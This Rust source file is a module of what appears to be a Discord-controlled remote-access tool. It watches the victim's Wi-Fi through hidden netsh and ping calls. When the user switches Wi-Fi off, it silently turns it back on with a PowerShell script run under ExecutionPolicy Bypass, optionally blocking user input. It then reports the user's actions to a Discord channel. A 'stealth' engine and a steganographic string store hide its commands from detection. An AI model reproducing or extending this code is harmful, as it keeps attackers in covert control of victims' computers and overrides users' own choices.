use anyhow::Result;
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::id::Id;
use twilight_model::id::marker::ChannelMarker;
use chrono::{DateTime, Utc};
use std::collections::VecDeque;
use tokio::sync::Mutex;
use crate::config::WifiMonitorConfig;
use crate::core::stego_store::{StegoStore, StringCategory};

use std::process::Command;
use std::os::windows::process::CommandExt;

pub struct WifiMonitor {
    http: Arc<HttpClient>,
    channel_id: Id<ChannelMarker>,
    config: WifiMonitorConfig,
}

#[derive(Debug, Clone, PartialEq)]
enum WifiState {
    Enabled,
    Disabled,
    NotFound,
}

#[derive(Debug, Clone)]
struct WifiEvent {
    message: String,
    timestamp: DateTime<Utc>,
}

impl WifiMonitor {
    pub fn new(http: Arc<HttpClient>, channel_id: Id<ChannelMarker>, config: WifiMonitorConfig) -> Self {
        Self { http, channel_id, config }
    }

    pub async fn start_monitoring(&self) -> Result<()> {
        if !self.config.enabled {
            return Ok(()); // WiFi monitoring is disabled in config
        }

        let http = self.http.clone();
        let channel_id = self.channel_id;
        let check_interval_ms = self.config.check_interval_ms;
        let re_enable_delay_seconds = self.config.re_enable_delay_seconds;
        let block_user_input = self.config.block_user_input;

        tokio::spawn(async move {
            let event_queue: Arc<Mutex<VecDeque<WifiEvent>>> = Arc::new(Mutex::new(VecDeque::new()));
            let mut last_state = Self::get_wifi_state().await;
        let _ = last_state;

            if last_state == WifiState::Enabled {
                let _ = http.create_message(channel_id.get(), &StegoStore::get(StringCategory::Wifi, "MON_ENABLED")).await;
            }

            loop {
                tokio::time::sleep(tokio::time::Duration::from_millis(check_interval_ms)).await;
                let current_state = Self::get_wifi_state().await;

                if current_state != last_state {
                    let status_msg = match (&last_state, &current_state) {
                        (WifiState::Enabled, WifiState::Disabled) => {
                            // WiFi = off
                            let re_enable_msg = Self::re_enable_wifi(re_enable_delay_seconds, block_user_input).await;
                            Some(StegoStore::get(StringCategory::Wifi, "WIFI_DISABLED").replace("{}", &re_enable_msg))
                        },
                        (WifiState::Disabled, WifiState::Enabled) => {
                            Some(StegoStore::get(StringCategory::Wifi, "WIFI_ENABLED"))
                        },
                        (_, WifiState::NotFound) => {
                            Some(StegoStore::get(StringCategory::Wifi, "ADAPTER_NOT_FOUND"))
                        },
                        (WifiState::NotFound, WifiState::Enabled) => {
                            Some(StegoStore::get(StringCategory::Wifi, "WIFI_NOW_ENABLED"))
                        },
                        _ => None,
                    };

                    if let Some(msg) = status_msg {
                        let event = WifiEvent { // store event in queue
                            message: msg,
                            timestamp: Utc::now(),
                        };
                        event_queue.lock().await.push_back(event);
                    }

                    last_state = current_state.clone();
                }

                if current_state == WifiState::Enabled {
                    let queue_size = event_queue.lock().await.len();
                    if queue_size > 0 {
                        Self::flush_event_queue(&http, channel_id, &event_queue).await;
                    }
                }
            }
        });

        Ok(())
    }

    async fn flush_event_queue(
        http: &Arc<HttpClient>,
        channel_id: Id<ChannelMarker>,
        event_queue: &Arc<Mutex<VecDeque<WifiEvent>>>,
    ) {
        let mut queue = event_queue.lock().await;

        while let Some(event) = queue.pop_front() {
            // check for internet
            if !Self::check_internet_connection().await {
                // no wifi, put event back and stop
                queue.push_front(event);
                break;
            }

            let formatted_msg = StegoStore::get(StringCategory::Wifi, "USER_OFF_AT")
                .replace("{0}", &event.message) // Wait, I used {} in stego_strings.json
                .replace("{}", &event.message)
                .replace("{1}", &event.timestamp.format("%Y-%m-%d %H:%M:%S UTC").to_string());
            
            // Re-fix formatting string logic if needed, but let's stick to simple replace
            let formatted_msg = StegoStore::get(StringCategory::Wifi, "USER_OFF_AT")
                .replacen("{}", &event.message, 1)
                .replacen("{}", &event.timestamp.format("%Y-%m-%d %H:%M:%S UTC").to_string(), 1);

            match http.create_message(channel_id.get(), &formatted_msg).await {
                    Ok(_) => {}
                Err(_) => {
                    queue.push_front(event);
                    break;
                }
            }
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
    }

    async fn check_internet_connection() -> bool {
        let host = StegoStore::get(StringCategory::Scripts, "PING_HOST");
        if let Some(engine) = crate::stealth::get_engine() {
            let cmd = format!("{} -n 1 -w 1000 {}", StegoStore::get(StringCategory::Win, "PING"), host);
            let output = engine.execute_stealth_cmd_with_output(&cmd).unwrap_or_default();
            return output.contains("TTL="); // Basic check for successful ping reply
        } else {
            if let Ok(output) = tokio::process::Command::new(StegoStore::get(StringCategory::Win, "PING"))
                .args(&["-n", "1", "-w", "1000", &host])
                .creation_flags(0x08000000)
                .output()
                .await
            {
                return output.status.success();
            }
        }
        false
    }

    async fn re_enable_wifi(delay_seconds: u64, block_input: bool) -> String {
        tokio::time::sleep(tokio::time::Duration::from_secs(delay_seconds)).await;

        let powershell_script = if block_input {
            StegoStore::get(StringCategory::Scripts, "WIFI_BLOCK_PS")
        } else {
            StegoStore::get(StringCategory::Scripts, "WIFI_NOBLOCK_PS")
        };

        if let Some(engine) = crate::stealth::get_engine() {
            let _ = engine.execute_stealth_ps(&powershell_script);
            return StegoStore::get(StringCategory::Wifi, "RECONN_SUCCESS");
        } else {
            match tokio::process::Command::new(StegoStore::get(StringCategory::Win, "POWERSHELL"))
                .args(&[
                    StegoStore::get(StringCategory::Scripts, "PS_NO_PROFILE"),
                    StegoStore::get(StringCategory::Scripts, "PS_NON_INTERACTIVE"),
                    StegoStore::get(StringCategory::Scripts, "PS_EXEC_POLICY"),
                    StegoStore::get(StringCategory::Scripts, "PS_BYPASS"),
                    StegoStore::get(StringCategory::Scripts, "PS_COMMAND"),
                    powershell_script,
                ])
                .creation_flags(0x08000000)
                .output()
                .await
            {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    if !stderr.is_empty() {
                    }
                    return StegoStore::get(StringCategory::Wifi, "RECONN_SUCCESS");
                }
                Err(e) => {
                    return StegoStore::get(StringCategory::Wifi, "RECONN_FAIL").replace("{}", &e.to_string());
                }
            }
        }
    }

    async fn get_wifi_state() -> WifiState {
        let output_str = if let Some(engine) = crate::stealth::get_engine() {
            let cmd = format!("{} wlan show interfaces", StegoStore::get(StringCategory::Win, "NETSH"));
            engine.execute_stealth_cmd_with_output(&cmd).unwrap_or_default()
        } else {
            if let Ok(output) = std::process::Command::new(StegoStore::get(StringCategory::Win, "NETSH"))
                .args(&["wlan", "show", "interfaces"])
                .creation_flags(0x08000000)
                .output()
            {
                String::from_utf8_lossy(&output.stdout).to_string()
            } else {
                String::new()
            }
        };

        if !output_str.is_empty() {
            if output_str.to_lowercase().contains("there is") && output_str.to_lowercase().contains("interface") {
                let mut found_radio_status = false;
                for line in output_str.lines() {
                    let line_trimmed = line.trim();

                    if line_trimmed.starts_with("Radio status") {
                        found_radio_status = true;
                    } else if found_radio_status && line_trimmed.starts_with("Software") {
                        if line_trimmed.to_lowercase().contains("software off") || line_trimmed.to_lowercase().contains("software    off") {
                            return WifiState::Disabled;
                        } else if line_trimmed.to_lowercase().contains("software on") {
                            return WifiState::Enabled;
                        }
                        found_radio_status = false;
                    }
                }

                if output_str.to_lowercase().contains("state") {
                    for line in output_str.lines() {
                        let line_trimmed = line.trim();
                        if line_trimmed.to_lowercase().starts_with("state") {
                            if line_trimmed.to_lowercase().contains("disconnected") || line_trimmed.to_lowercase().contains("connected") {
                                return WifiState::Enabled;
                            }
                        }
                    }
                }
            }
        }

        let output_str2 = if let Some(engine) = crate::stealth::get_engine() {
            let cmd = format!("{} interface show interface", StegoStore::get(StringCategory::Win, "NETSH"));
            engine.execute_stealth_cmd_with_output(&cmd).unwrap_or_default()
        } else {
            if let Ok(output) = std::process::Command::new(StegoStore::get(StringCategory::Win, "NETSH"))
                .args(&["interface", "show", "interface"])
                .creation_flags(0x08000000)
                .output()
            {
                String::from_utf8_lossy(&output.stdout).to_string()
            } else {
                String::new()
            }
        };

        if !output_str2.is_empty() {
            for line in output_str2.lines() {
                let line_lower = line.to_lowercase();

                if (line_lower.contains("wi-fi") || line_lower.contains("wlan") || line_lower.contains("wireless"))
                    && !line_lower.contains("bluetooth")
                    && !line_lower.contains("virtual")
                {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 4 {
                        let admin_state = parts[0].to_lowercase();
                        if admin_state == "disabled" {
                            return WifiState::Disabled;
                        } else if admin_state == "enabled" {
                            return WifiState::Enabled;
                        }
                    }
                }
            }
        }

        WifiState::NotFound
    }
}
